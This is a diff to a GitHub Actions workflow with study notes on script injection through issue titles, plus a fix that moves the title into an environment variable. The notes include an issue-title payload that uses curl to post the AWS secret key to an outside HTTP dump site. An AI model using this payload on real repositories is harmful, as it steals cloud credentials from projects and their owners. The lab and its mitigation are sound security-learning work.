@@ -7,6 +7,7 @@ on:
 
 jobs:
   assign-label:
+    continue-on-error: true
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4.1.1
@@ -23,6 +24,7 @@ jobs:
           fi 
 
 #HOW IT WORKS 
+# create on main branch 
 # 1. workflow gets triggered when a new issue is opened on the isssue tab, it will excute to this workflow
 # 2. job name is assign label it runs on github hosted ubuntu runner
 # 3. checkout is to check repo if the issue is active is on the this repo
@@ -33,8 +35,42 @@ jobs:
 # 8. go back to issues and put bug"; $GITHUB_WORKSPACE" is command after the double quotes"" that wants to get a list of repo >> it injects malicious code 
 # 9. go to the logs the malicies code gets excuted all contents of file is shown
 
+# HOW TO EXTRACT SECRETS
 
-        
+# 1. go to https dump >> copy the url part only https://
+# 2. go to issues on github bug";"
+    # ANYTHING IN DOUBLE ";" CAN GET EXECUTED ON ISSUES TITLE LINE
+     #curl -- request POST --data anything=$AWS_SECRET_ACCES_KEYhttps://httpdump.app/dumps/edc9c692-645a-49fc-a54d-e957f9e40663
+     #CURL >> gets the website 
+     #request POST --data anything= >>> $varable or secret 
+     #website it is a http dump website to get the findng 
+#3. TYPE IN ISSUE LINE: >> bug";curl -- request POST --data anything=$AWS_SECRET_ACCES_KEYhttps://httpdump.app/dumps/edc9c692-645a-49fc-a54d-e957f9e40663"
+#4. go to logs see if it is sucessful or not 
+#5 go back to http dump.com and a new entry is made look at the anything = secret or variable is displayed 
+
+# HOW TO MIGRATE IT 
+# 1. Turn issue_title="${{ github.event.issue.title }}" into a variable
+# 2. issue_title:"${{ github.event.issue.title }}"
+# 3. now it is stored in memory this is how it secures the workflow
+# 4. BEFORE IT ACTIVATED AS A SCRIPT UNDER THE RUN PIPELINE MAKEING IT EASY FOR HACKING 
+
+
+  updated-assigned-label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4.1.1
+      - name: add a label
+        env:
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          issue_title: "${{ github.event.issue.title }}"  # turned into a pipe 
+        run: | 
+          if [[ "$issue_title" == *"bug"* ]]; then
+             echo "issue is about a bug!"
+             echo "Assigning Label - BUG .... .... .... .... .... .."
+          else
+            echo "Not a bug "
+          fi 
+
 
 
 
